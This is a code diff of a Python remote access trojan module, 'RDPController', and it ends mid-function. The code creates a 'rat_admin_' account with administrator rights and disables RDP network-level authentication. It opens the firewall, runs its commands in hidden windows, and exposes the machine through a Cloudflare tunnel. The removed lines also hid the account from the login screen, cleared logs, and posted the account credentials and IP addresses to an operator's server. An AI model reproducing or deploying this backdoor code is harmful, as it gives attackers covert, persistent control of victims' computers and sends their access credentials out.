@@ -10,533 +10,561 @@ import ctypes
 import time
 import string
 import random
+import sys
+import re
+from typing import Dict, Optional, Any
 from config import Config
 from encryption.manager import EncryptionManager
-from subprocess import run
-from typing import Dict, Optional
+from network.communicator import ServerCommunicator
 
 class RDPController:
     def __init__(self, encryption_manager: EncryptionManager):
         self.encryption = encryption_manager
+        self.communicator = ServerCommunicator(Config.get_client_id(), encryption_manager)
         self.username = f"rat_admin_{uuid.uuid4().hex[:8]}"
-        # Generate a strong password compliant with Windows policies
         chars = string.ascii_letters + string.digits + "!@#$%^&*"
-        self.password = ''.join(random.choice(chars) for _ in range(16))
+        self.password = ''.join(random.choice(chars) for _ in range(14))  # 14-character password
+        self.cloudflared_process = None
+        self.tunnel_url = None
+        self.rdp_wrapper_installed = False
         if Config.DEBUG_MODE:
-            logging.info(f"RDPController initialized with username: {self.username}, password: {self.password}")
+            logging.info(f"RDPController initialized. User: {self.username}, Pass: {self.password[:4]}****")
 
     def _is_admin(self) -> bool:
+        """Check for Administrator access"""
         try:
             return ctypes.windll.shell32.IsUserAnAdmin() != 0
-        except:
+        except Exception as e:
+            logging.error(f"Admin check error: {str(e)}")
             return False
 
-    def _user_exists(self, username: str) -> bool:
+    def _run_command(self, cmd: list, timeout: int = 30) -> Dict[str, str]:
+        """Execute command with advanced error handling"""
         try:
-            result = run(
-                ["net", "user", username],
-                capture_output=True,
+            logging.debug(f"Executing: {' '.join(cmd)}")
+            result = subprocess.run(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
                 text=True,
-                check=True,
+                timeout=timeout,
                 creationflags=subprocess.CREATE_NO_WINDOW
             )
-            logging.info(f"User check output for {username}: {result.stdout}")
-            return result.returncode == 0
-        except subprocess.CalledProcessError as e:
-            logging.info(f"User {username} does not exist: {e.stderr}")
+            output = {
+                "status": "success" if result.returncode == 0 else "error",
+                "stdout": result.stdout.strip(),
+                "stderr": result.stderr.strip()
+            }
+            if "longer than 14 characters" in output['stderr']:
+                output['stderr'] += "\n[WARN] Legacy Windows password restriction detected!"
+            elif "The specified rule already exists" in output['stderr']:
+                output['status'] = "success"
+                output['stderr'] += "\n[INFO] Rule already exists"
+            elif "Access is denied" in output['stderr']:
+                output['stderr'] += "\n[ERROR] Insufficient permissions"
+            logging.debug(f"Command result: {output}")
+            return output
+        except Exception as e:
+            logging.error(f"Command execution crashed: {str(e)}")
+            return {"status": "error", "stdout": "", "stderr": str(e)}
+
+    def _user_exists(self, username: str) -> bool:
+        """Check if user exists"""
+        try:
+            ps_command = f"Get-LocalUser -Name '{username}' -ErrorAction SilentlyContinue"
+            result = self._run_command(["powershell", "-Command", ps_command])
+            return result["status"] == "success" and username in result["stdout"]
+        except Exception as e:
+            logging.error(f"User check failed: {str(e)}")
             return False
 
     def _is_user_in_group(self, username: str, group: str) -> bool:
+        """Check if user is in group"""
         try:
-            result = run(
-                ["net", "localgroup", group],
-                capture_output=True,
-                text=True,
-                check=True,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            return username in result.stdout
-        except subprocess.CalledProcessError as e:
-            logging.error(f"Failed to check group membership for {group}: {e.stderr}")
+            ps_command = f"Get-LocalGroupMember -Group '{group}' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name"
+            result = self._run_command(["powershell", "-Command", ps_command])
+            return result["status"] == "success" and username in result["stdout"]
+        except Exception as e:
+            logging.error(f"Group check failed: {str(e)}")
             return False
 
     def _start_service(self, service_name: str) -> bool:
+        """Start service"""
         try:
-            result = run(
-                ["sc", "query", service_name],
-                capture_output=True,
-                text=True,
-                check=True,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            if "RUNNING" not in result.stdout:
+            result = self._run_command(["sc", "query", service_name])
+            if result["status"] == "success" and "RUNNING" not in result["stdout"]:
                 logging.info(f"Starting service {service_name}...")
-                run(
-                    ["net", "start", service_name],
-                    check=True,
-                    capture_output=True,
-                    text=True,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
+                result = self._run_command(["net", "start", service_name])
+                if result["status"] != "success":
+                    logging.error(f"Failed to start service {service_name}: {result['stderr']}")
+                    return False
             logging.info(f"Service {service_name} is running")
             return True
-        except subprocess.CalledProcessError as e:
-            logging.error(f"Failed to start service {service_name}: {e.stderr}")
+        except Exception as e:
+            logging.error(f"Service start failed: {str(e)}")
             return False
 
-    def _restart_service(self, service_name: str) -> bool:
-        try:
-            logging.info(f"Restarting service {service_name}...")
-            run(
-                ["net", "stop", service_name],
-                capture_output=True,
-                text=True,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            time.sleep(1)
-            run(
-                ["net", "start", service_name],
-                check=True,
-                capture_output=True,
-                text=True,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            logging.info(f"Service {service_name} restarted")
-            return True
-        except subprocess.CalledProcessError as e:
-            logging.error(f"Failed to restart service {service_name}: {e.stderr}")
-            return False
+    def _configure_firewall(self) -> bool:
+        """Configure firewall with multiple methods and strong validation"""
+        logging.info("Configuring firewall rules for RDP...")
 
-    def _create_user_powershell(self, username: str, password: str) -> bool:
-        """Attempt to create user via PowerShell as a fallback."""
-        try:
-            ps_command = (
-                f"New-LocalUser -Name '{username}' -Password (ConvertTo-SecureString '{password}' -AsPlainText -Force) "
-                f"-FullName '{username}' -Description 'RDP Access User' -AccountNeverExpires; "
-                f"Add-LocalGroupMember -Group 'Administrators' -Member '{username}' -ErrorAction SilentlyContinue; "
-                f"Add-LocalGroupMember -Group 'Remote Desktop Users' -Member '{username}' -ErrorAction SilentlyContinue"
-            )
-            result = run(
-                ["powershell", "-Command", ps_command],
-                capture_output=True,
-                text=True,
-                check=True,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            logging.info(f"PowerShell user creation output: {result.stdout}")
-            return True
-        except subprocess.CalledProcessError as e:
-            logging.error(f"Failed to create user via PowerShell: {e.stderr}")
-            return False
-
-    def _check_port_powershell(self, port: str) -> bool:
-        """Check if a port is listening using PowerShell."""
-        try:
-            ps_command = f"Get-NetTCPConnection -LocalPort {port} -State Listen -ErrorAction SilentlyContinue"
-            result = run(
-                ["powershell", "-Command", ps_command],
-                capture_output=True,
-                text=True,
-                check=True,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            return bool(result.stdout.strip())
-        except subprocess.CalledProcessError as e:
-            logging.warning(f"PowerShell port check failed: {e.stderr}")
-            return False
-
-    def enable_rdp(self) -> Dict[str, any]:
-        try:
-            if not self._is_admin():
-                logging.error("Admin privileges required to enable RDP")
-                return {"status": "error", "message": "Admin privileges required"}
-
-            if os.name != "nt":
-                logging.error("This operation is only supported on Windows")
-                return {"status": "error", "message": "Unsupported operating system"}
-
-            # Check Windows version compatibility
-            try:
-                result = run(
-                    ["systeminfo"],
-                    capture_output=True,
-                    text=True,
-                    check=True,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
-                if "Home" in result.stdout:
-                    logging.warning("Windows Home edition detected, RDP may not be supported")
-            except Exception as e:
-                logging.warning(f"Failed to check Windows version: {str(e)}")
-
-            # Enable RDP in registry
-            logging.info("Enabling RDP in registry...")
-            try:
-                # Main RDP setting
-                reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
-                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
-                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
-                    winreg.SetValueEx(key, "fAllowToGetHelp", 0, winreg.REG_DWORD, 1)
-
-                # Ensure RDP port is 3389
-                reg_path_tcp = r"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
-                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path_tcp, 0, winreg.KEY_SET_VALUE) as key:
-                    winreg.SetValueEx(key, "PortNumber", 0, winreg.REG_DWORD, 3389)
-                logging.info("RDP enabled in registry with port 3389")
-            except Exception as e:
-                logging.error(f"Failed to enable RDP in registry: {str(e)}")
-                return {"status": "error", "message": f"Failed to enable RDP in registry: {str(e)}"}
-
-            # Disable NLA
-            logging.info("Disabling NLA for RDP...")
-            try:
-                run(
-                    ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
-                     "/v", "UserAuthentication", "/t", "REG_DWORD", "/d", "0", "/f"],
-                    check=True,
-                    capture_output=True,
-                    text=True,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
-                logging.info("NLA disabled successfully")
-            except subprocess.CalledProcessError as e:
-                logging.warning(f"Failed to disable NLA: {e.stderr}")
-
-            # Start and restart RDP services
-            logging.info("Starting and restarting RDP services...")
-            for service in ["TermService", "SessionEnv", "UmRdpService"]:
-                if not self._start_service(service):
-                    return {"status": "error", "message": f"Failed to start service {service}"}
-                self._restart_service(service)  # Restart to ensure activation
-            time.sleep(5)  # Wait for services to stabilize
-
-            # Clean up duplicate firewall rules
-            logging.info("Cleaning up duplicate RDP firewall rules...")
-            try:
-                run(
-                    ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
-                    check=True,
-                    capture_output=True,
-                    text=True,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
-                logging.info("Duplicate firewall rules cleared")
-            except subprocess.CalledProcessError:
-                logging.info("No duplicate firewall rules found")
-
-            # Configure firewall for RDP
-            logging.info("Configuring firewall for RDP...")
-            try:
-                result = run(
-                    ["netsh", "advfirewall", "firewall", "add", "rule",
-                     "name=Allow RDP", "dir=in", "action=allow",
-                     "protocol=TCP", "localport=3389"],
-                    check=True,
-                    capture_output=True,
-                    text=True,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
-                logging.info(f"Firewall configuration output: {result.stdout}")
-            except subprocess.CalledProcessError as e:
-                logging.error(f"Failed to configure firewall: {e.stderr}")
-                return {"status": "error", "message": f"Failed to configure firewall: {str(e)}"}
-
-            # Create hidden user
-            if self._user_exists(self.username):
-                logging.warning(f"User {self.username} already exists, resetting password...")
-                try:
-                    run(
-                        ["net", "user", self.username, self.password],
-                        check=True,
-                        capture_output=True,
-                        text=True,
-                        creationflags=subprocess.CREATE_NO_WINDOW
-                    )
-                    logging.info(f"Password reset for user {self.username}")
-                except subprocess.CalledProcessError as e:
-                    logging.error(f"Failed to reset user password: {e.stderr}")
-                    return {"status": "error", "message": f"Failed to reset user password: {e.stderr}"}
+        # Clean up old rules
+        cleanup_commands = [
+            ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
+            ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue"],
+            ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'AllowRDP' -ErrorAction SilentlyContinue"]
+        ]
+        for cmd in cleanup_commands:
+            result = self._run_command(cmd)
+            if result["status"] == "success":
+                logging.info(f"Cleaned up firewall rule: {cmd[0]}")
             else:
-                logging.info(f"Creating hidden user: {self.username} with password: {self.password}")
-                user_created = False
-                # Try net user first
-                try:
-                    result = run(
-                        ["net", "user", self.username, self.password, "/add"],
-                        capture_output=True,
-                        text=True,
-                        check=True,
-                        creationflags=subprocess.CREATE_NO_WINDOW
-                    )
-                    logging.info(f"User creation output: {result.stdout}")
-                    user_created = True
-                except subprocess.CalledProcessError as e:
-                    logging.warning(f"Failed to create user via net user: {e.stderr}")
+                logging.debug(f"Cleanup command {cmd[0]} output: {result['stderr']}")
 
-                # Fallback to PowerShell
-                if not user_created and not self._create_user_powershell(self.username, self.password):
-                    logging.error("Failed to create user via PowerShell")
-                    return {"status": "error", "message": f"Failed to create user: {e.stderr or 'Unknown error'}"}
-
-                # Add to groups if not already a member
-                try:
-                    for group in ["Administrators", "Remote Desktop Users"]:
-                        if not self._is_user_in_group(self.username, group):
-                            result = run(
-                                ["net", "localgroup", group, self.username, "/add"],
-                                check=True,
-                                capture_output=True,
-                                text=True,
-                                creationflags=subprocess.CREATE_NO_WINDOW
-                            )
-                            logging.info(f"Added {self.username} to {group}: {result.stdout}")
-                        else:
-                            logging.info(f"User {self.username} is already a member of {group}")
-                    result = run(
-                        ["net", "user", self.username, "/active:yes"],
-                        check=True,
-                        capture_output=True,
-                        text=True,
-                        creationflags=subprocess.CREATE_NO_WINDOW
-                    )
-                    logging.info(f"User {self.username} activated")
-                except subprocess.CalledProcessError as e:
-                    if "1378" in e.stderr:  # Handle "already a member" error
-                        logging.info(f"User {self.username} already in group, continuing...")
-                    else:
-                        logging.error(f"Failed to configure user permissions: {e.stderr}")
-                        return {"status": "error", "message": f"Failed to configure user permissions: {str(e)}"}
-
-                # Hide user
-                try:
-                    reg_path_user = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
-                    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path_user) as key:
-                        winreg.SetValueEx(key, self.username, 0, winreg.REG_DWORD, 0)
-                    logging.info(f"User {self.username} hidden from login screen")
-                except Exception as e:
-                    logging.warning(f"Failed to hide user {self.username}: {e}")
-
-            # Collect connection info
-            logging.info("Collecting connection info...")
-            info = self._get_connection_info()
-            if not info:
-                logging.error("Failed to get connection info")
-                return {"status": "error", "message": "Failed to get connection info"}
-
-            # Send RDP info to server
-            logging.info("Sending RDP info to server...")
-            if not self._send_to_server(info):
-                logging.error("Failed to send RDP info to server")
-                return {"status": "error", "message": "Failed to send RDP info to server"}
-
-            self._cleanup_logs()
-
-            # Verify RDP port
-            logging.info("Verifying RDP port...")
-            for attempt in range(3):
-                try:
-                    # Try netstat first
-                    result = run(
-                        ["netstat", "-an"],
-                        capture_output=True,
-                        text=True,
-                        check=True,
-                        creationflags=subprocess.CREATE_NO_WINDOW
-                    )
-                    if "3389" in result.stdout and "LISTENING" in result.stdout:
-                        logging.info("RDP port 3389 is active")
-                        break
-
-                    # Try PowerShell as fallback
-                    if self._check_port_powershell("3389"):
-                        logging.info("RDP port 3389 is active (PowerShell check)")
-                        break
-
-                    logging.warning(f"RDP port 3389 not listening (attempt {attempt+1})")
-                    self._restart_service("TermService")  # Retry restarting service
-                    time.sleep(5)  # Wait longer
-                except subprocess.CalledProcessError as e:
-                    logging.error(f"Failed to check RDP port: {e.stderr}")
-                    return {"status": "error", "message": f"Failed to check RDP port: {str(e)}"}
-            else:
-                logging.error("RDP port 3389 is not listening after retries")
-                return {"status": "error", "message": "RDP port 3389 is not listening after retries"}
-
-            logging.info("RDP setup completed successfully")
-            return {
-                "status": "success",
-                "message": "RDP enabled and configured successfully",
-                "data": info
+        # Firewall rule creation methods
+        methods = [
+            {
+                "type": "powershell_new",
+                "cmd": [
+                    "powershell", "-Command",
+                    "New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound "
+                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any -Enabled True"
+                ],
+                "validation": lambda: self._run_command(
+                    ["powershell", "-Command", "Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue | Where-Object { $_.Enabled -eq $True }"]
+                )["status"] == "success"
+            },
+            {
+                "type": "powershell_set",
+                "cmd": [
+                    "powershell", "-Command",
+                    "if (Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue) { "
+                    "Set-NetFirewallRule -DisplayName 'Allow RDP' -Enabled True -Direction Inbound "
+                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any } else { "
+                    "New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound "
+                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any -Enabled True }"
+                ],
+                "validation": lambda: self._run_command(
+                    ["powershell", "-Command", "Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue | Where-Object { $_.Enabled -eq $True }"]
+                )["status"] == "success"
+            },
+            {
+                "type": "netsh",
+                "cmd": [
+                    "netsh", "advfirewall", "firewall", "add", "rule",
+                    "name=Allow RDP", "dir=in", "action=allow",
+                    "protocol=TCP", "localport=3389", "profile=any", "enable=yes"
+                ],
+                "validation": lambda: "Enabled: Yes" in self._run_command(
+                    ["netsh", "advfirewall", "firewall", "show", "rule", "name=Allow RDP"]
+                )["stdout"]
             }
+        ]
 
+        # Attempt to create rule
+        for attempt in range(3):
+            logging.info(f"Firewall configuration attempt {attempt+1}")
+            for method in methods:
+                try:
+                    result = self._run_command(method["cmd"])
+                    logging.debug(f"Firewall {method['type']} result: {result}")
+                    if result["status"] == "success":
+                        if method["validation"]():
+                            logging.info(f"Firewall rule applied via {method['type']}")
+                            return True
+                        else:
+                            logging.warning(f"Validation failed for {method['type']}: {result['stdout'][:100]}...")
+                    else:
+                        logging.warning(f"Failed to apply rule via {method['type']}: {result['stderr'][:100]}...")
+                except Exception as e:
+                    logging.error(f"Error in firewall method {method['type']}: {str(e)}")
+                time.sleep(2)
+
+        # Manual port check
+        if self._check_port(3389):
+            logging.info("Port 3389 is open despite firewall rule failure; proceeding")
+            return True
+
+        logging.error("All firewall configuration methods failed")
+        return False
+
+    def _create_user(self) -> bool:
+        """Create user with hybrid system"""
+        logging.info(f"Creating user {self.username}")
+
+        if self._user_exists(self.username):
+            logging.info(f"User {self.username} exists, resetting password...")
+            result = self._run_command(["net", "user", self.username, self.password[:14]])
+            if result["status"] == "success":
+                return True
+            logging.error(f"Failed to reset password: {result['stderr']}")
+            return False
+
+        methods = [
+            {
+                "type": "netuser",
+                "cmd": ["net", "user", self.username, self.password[:14], "/add"],
+                "validation": lambda: self._user_exists(self.username)
+            },
+            {
+                "type": "powershell",
+                "cmd": [
+                    "powershell", "-Command",
+                    f"$pass = ConvertTo-SecureString '{self.password}' -AsPlainText -Force; "
+                    f"New-LocalUser -Name '{self.username}' -Password $pass -AccountNeverExpires -Description 'RDP User'"
+                ],
+                "validation": lambda: self._user_exists(self.username)
+            }
+        ]
+
+        for method in methods:
+            for attempt in range(3):
+                result = self._run_command(method["cmd"])
+                if result["status"] == "success" and method["validation"]():
+                    logging.info(f"User created via {method['type']}")
+                    return True
+                logging.warning(f"User creation attempt {attempt+1} via {method['type']} failed: {result['stderr']}")
+                time.sleep(1)
+        
+        logging.error("All user creation methods failed")
+        return False
+
+    def _configure_user_groups(self) -> bool:
+        """Configure user groups"""
+        groups = ["Administrators", "Remote Desktop Users"]
+        for group in groups:
+            if not self._is_user_in_group(self.username, group):
+                for attempt in range(3):
+                    cmd = ["net", "localgroup", group, self.username, "/add"]
+                    result = self._run_command(cmd)
+                    if result["status"] == "success":
+                        logging.info(f"Added {self.username} to {group}")
+                        break
+                    logging.warning(f"Failed to add to {group}, attempt {attempt+1}: {result['stderr']}")
+                    time.sleep(1)
+                else:
+                    logging.error(f"Failed to add {self.username} to {group}")
+                    return False
+        return True
+
+    def _enable_rdp_registry(self) -> bool:
+        """Enable RDP in registry"""
+        try:
+            reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
+                winreg.SetValueEx(key, "fAllowToGetHelp", 0, winreg.REG_DWORD, 1)
+
+            reg_path_tcp = r"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path_tcp, 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, "PortNumber", 0, winreg.REG_DWORD, 3389)
+
+            result = self._run_command([
+                "reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
+                "/v", "UserAuthentication", "/t", "REG_DWORD", "/d", "0", "/f"
+            ])
+            if result["status"] == "success":
+                logging.info("NLA disabled for RDP compatibility")
+
+            result = self._run_command(["gpupdate", "/force"])
+            if result["status"] == "success":
+                logging.info("Group Policy updated")
+            else:
+                logging.warning(f"Group Policy update failed: {result['stderr']}")
+
+            logging.info("RDP enabled in registry")
+            return True
         except Exception as e:
-            logging.error(f"Failed to enable RDP: {str(e)}")
-            return {"status": "error", "message": f"RDP enable failed: {str(e)}"}
+            logging.error(f"Registry error: {str(e)}")
+            return False
 
-    def disable_rdp(self) -> Dict[str, any]:
+    def _check_port(self, port: int) -> bool:
+        """Check if port is open"""
+        try:
+            for attempt in range(3):
+                result = self._run_command(["netstat", "-an"])
+                if result["status"] == "success" and f":{port}" in result["stdout"] and "LISTENING" in result["stdout"]:
+                    logging.info(f"Port {port} is open")
+                    return True
+                logging.debug(f"Port check attempt {attempt+1} failed")
+                time.sleep(2)
+            logging.warning(f"Port {port} is not open")
+            return False
+        except Exception as e:
+            logging.error(f"Port check failed: {str(e)}")
+            return False
+
+    def _configure_cloudflare_hostname(self) -> bool:
+        """Configure Cloudflare Public Hostname for RDP"""
+        try:
+            # Handle cloudflared path for PyInstaller
+            if getattr(sys, 'frozen', False):
+                base_path = sys._MEIPASS
+            else:
+                base_path = os.path.dirname(__file__)
+            cloudflared_path = os.path.join(base_path, Config.CLOUDFLARE_BINARY)
+            if not os.path.exists(cloudflared_path):
+                logging.error(f"Cloudflared binary not found at {cloudflared_path}")
+                return False
+
+            # Validate configuration
+            if not Config.CLOUDFLARE_SUBDOMAIN or not Config.CLOUDFLARE_DOMAIN or not Config.CLOUDFLARE_TUNNEL_TOKEN:
+                logging.error("Cloudflare subdomain, domain, or tunnel token missing in config")
+                return False
+
+            # Create Public Hostname
+            hostname = f"{Config.CLOUDFLARE_SUBDOMAIN}.{Config.CLOUDFLARE_DOMAIN}"
+            cloudflared_cmd = [
+                cloudflared_path, "tunnel", "route", "dns",
+                "rdp-tunnel", hostname
+            ]
+            result = self._run_command(cloudflared_cmd)
+            if result["status"] != "success":
+                logging.error(f"Failed to create DNS record for {hostname}: {result['stderr']}")
+                return False
+            logging.info(f"DNS record for {hostname} created")
+
+            # Configure Public Hostname for RDP
+            config_yaml_path = os.path.join(base_path, "config.yml")
+            config_content = f"""tunnel: rdp-tunnel
+credentials-file: {os.path.join(base_path, 'cloudflared_credentials.json')}
+ingress:
+  - hostname: {hostname}
+    service: rdp://localhost:3389
+  - service: http_status:404
+"""
+            with open(config_yaml_path, "w") as f:
+                f.write(config_content)
+
+            # Save tunnel credentials
+            with open(os.path.join(base_path, "cloudflared_credentials.json"), "w") as f:
+                json.dump({"AccountTag": "", "TunnelSecret": Config.CLOUDFLARE_TUNNEL_TOKEN, "TunnelID": ""}, f)
+
+            # Start tunnel
+            tunnel_cmd = [
+                cloudflared_path, "tunnel", "--config", config_yaml_path,
+                "run", "rdp-tunnel"
+            ]
+            self.cloudflared_process = subprocess.Popen(
+                tunnel_cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+
+            # Wait for tunnel URL
+            timeout = 30
+            start_time = time.time()
+            while time.time() - start_time < timeout:
+                if self.cloudflared_process.poll() is not None:
+                    stdout, stderr = self.cloudflared_process.communicate()
+                    logging.error(f"Cloudflared terminated with error: {stderr[:100]}...")
+                    return False
+                line = self.cloudflared_process.stdout.readline().strip()
+                if line and hostname in line:
+                    self.tunnel_url = hostname
+                    logging.info(f"Cloudflare tunnel started: {hostname}")
+                    return True
+                time.sleep(0.5)
+
+            logging.error("Cloudflare tunnel startup timeout")
+            return False
+        except Exception as e:
+            logging.error(f"Cloudflare hostname configuration failed: {str(e)}")
+            return False
+
+    def _start_cloudflare_tunnel(self) -> Optional[str]:
+        """Start Cloudflare Tunnel"""
+        if self._configure_cloudflare_hostname():
+            return self.tunnel_url
+        return None
+
+    def _get_manual_fallback_instructions(self, local_ip: str, public_ip: str) -> str:
+        """Get fallback instructions if tunnel fails"""
+        instructions = (
+            f"Cloudflare tunnel failed. Manual port forwarding required:\n"
+            f"1. Access your router's admin panel (e.g., http://192.168.1.1).\n"
+            f"2. Log in (check router manual for default username/password).\n"
+            f"3. Navigate to 'Port Forwarding' or 'Virtual Servers'.\n"
+            f"4. Create a new rule:\n"
+            f"   - External Port: 3389\n"
+            f"   - Internal Port: 3389\n"
+            f"   - Protocol: TCP\n"
+            f"   - Internal IP: {local_ip}\n"
+            f"5. Save settings.\n"
+            f"6. Connect to RDP using: {public_ip}:3389\n"
+            f"   Username: {self.username}\n"
+            f"   Password: {self.password}\n"
+            f"Note: If {public_ip} is 'unknown', use 'curl ifconfig.me' or visit https://whatismyipaddress.com."
+        )
+        return instructions
+
+    def enable_rdp(self) -> Dict[str, Any]:
+        """Enable RDP fully"""
         try:
             if not self._is_admin():
-                logging.error("Admin privileges required to disable RDP")
-                return {"status": "error", "message": "Admin privileges required"}
+                return {"status": "error", "message": "Admin rights required"}
 
-            logging.info("Disabling RDP in registry...")
-            try:
-                reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
-                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
-                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
-                logging.info("RDP disabled in registry")
-            except Exception as e:
-                logging.warning(f"Failed to disable RDP in registry: {str(e)}")
+            if not self._enable_rdp_registry():
+                return {"status": "error", "message": "Registry configuration failed"}
 
-            logging.info("Stopping RDP services...")
-            for service in ["TermService", "SessionEnv", "UmRdpService"]:
-                try:
-                    run(
-                        ["net", "stop", service],
-                        check=True,
-                        capture_output=True,
-                        text=True,
-                        creationflags=subprocess.CREATE_NO_WINDOW
-                    )
-                    logging.info(f"Service {service} stopped")
-                except subprocess.CalledProcessError as e:
-                    logging.warning(f"Failed to stop service {service}: {e.stderr}")
+            if not self._create_user():
+                return {"status": "error", "message": "User creation failed"}
 
-            logging.info("Removing firewall rules for RDP...")
-            try:
-                run(
-                    ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
-                    check=True,
-                    capture_output=True,
-                    text=True,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
-                logging.info("RDP firewall rule removed")
-            except subprocess.CalledProcessError as e:
-                logging.warning(f"Failed to remove firewall rule: {e.stderr}")
+            if not self._configure_user_groups():
+                return {"status": "error", "message": "Group configuration failed"}
 
-            if self._user_exists(self.username):
-                logging.info(f"Removing hidden user: {self.username}...")
-                try:
-                    run(
-                        ["net", "user", self.username, "/delete"],
-                        check=True,
-                        capture_output=True,
-                        text=True,
-                        creationflags=subprocess.CREATE_NO_WINDOW
-                    )
-                    logging.info(f"User {self.username} deleted")
-                except subprocess.CalledProcessError as e:
-                    logging.warning(f"Failed to delete user {self.username}: {e.stderr}")
+            firewall_success = self._configure_firewall()
+            if not firewall_success:
+                logging.warning("Firewall configuration failed; proceeding")
 
-            logging.info("RDP disabled successfully")
-            return {"status": "success", "message": "RDP disabled successfully"}
+            if not self._check_port(3389):
+                logging.warning("Port 3389 is not open; attempting to restart services")
+                for service in ["TermService", "SessionEnv", "UmRdpService"]:
+                    if not self._start_service(service):
+                        return {"status": "error", "message": f"Service {service} failed"}
+                time.sleep(5)
+                if not self._check_port(3389):
+                    return {"status": "error", "message": "Port 3389 is not open after retries"}
 
-        except Exception as e:
-            logging.error(f"Failed to disable RDP: {str(e)}")
-            return {"status": "error", "message": f"Failed to disable RDP: {str(e)}"}
+            services = ["TermService", "SessionEnv", "UmRdpService"]
+            for service in services:
+                if not self._start_service(service):
+                    return {"status": "error", "message": f"Service {service} failed"}
 
-    def _get_connection_info(self) -> Optional[Dict]:
-        try:
-            local_ip = socket.gethostbyname(socket.gethostname())
-            public_ip = ""
-            for url in [
-                "https://api.ipify.org?format=json",
-                "https://ipinfo.io/json",
-                "https://ifconfig.me/ip",
-            ]:
-                try:
-                    response = requests.get(url, timeout=5, verify=False)
-                    if response.status_code == 200:
-                        if url.endswith("format=json"):
-                            public_ip = response.json().get("ip", "")
-                        else:
-                            public_ip = response.text.strip()
-                        if public_ip:
-                            break
-                    logging.warning(f"Failed to get public IP from {url}: status={response.status_code}, response={response.text}")
-                except Exception as e:
-                    logging.warning(f"Failed to get public IP from {url}: {str(e)}")
+            local_ip = self._get_local_ip()
+            public_ip = self._get_public_ip()
+            tunnel_url = self._start_cloudflare_tunnel()
 
-            info = {
-                "local_ip": local_ip,
-                "public_ip": public_ip,
+            connection_info = {
                 "username": self.username,
                 "password": self.password,
-                "client_id": Config.get_client_id()
+                "local_ip": local_ip,
+                "public_ip": public_ip,
+                "port": 3389,
+                "firewall_status": "success" if firewall_success else "failed"
             }
-            logging.info(f"Connection info: {info}")
-            return info
-        except Exception as e:
-            logging.error(f"Failed to get connection info: {str(e)}")
-            return None
 
-    def _send_to_server(self, info: Dict) -> bool:
-        try:
-            encrypted_info = self.encryption.encrypt(json.dumps(info))
-            payload = {
-                "action": "report_rdp",
-                "client_id": info["client_id"],
-                "rdp_info": encrypted_info,
-                "token": Config.SECRET_TOKEN
-            }
-            headers = {
-                "X-Secret-Token": str(Config.SECRET_TOKEN),
-                "Content-Type": "application/json"
-            }
-            logging.info(f"Sending payload to server: {payload}")
-
-            for attempt in range(3):
-                try:
-                    response = requests.post(
-                        Config.SERVER_URL,
-                        json=payload,
-                        headers=headers,
-                        timeout=15
-                    )
-                    logging.info(f"Response status: {response.status_code}, text: {response.text[:200]}")
-                    if response.status_code == 200:
-                        logging.info("Successfully sent RDP info to server")
-                        return True
-                    logging.error(f"Server responded with status {response.status_code}: {response.text}")
-                except requests.exceptions.SSLError as ssl_err:
-                    logging.warning(f"SSL error (attempt {attempt+1}): {ssl_err}. Retrying without SSL verification...")
-                    try:
-                        response = requests.post(
-                            Config.SERVER_URL,
-                            json=payload,
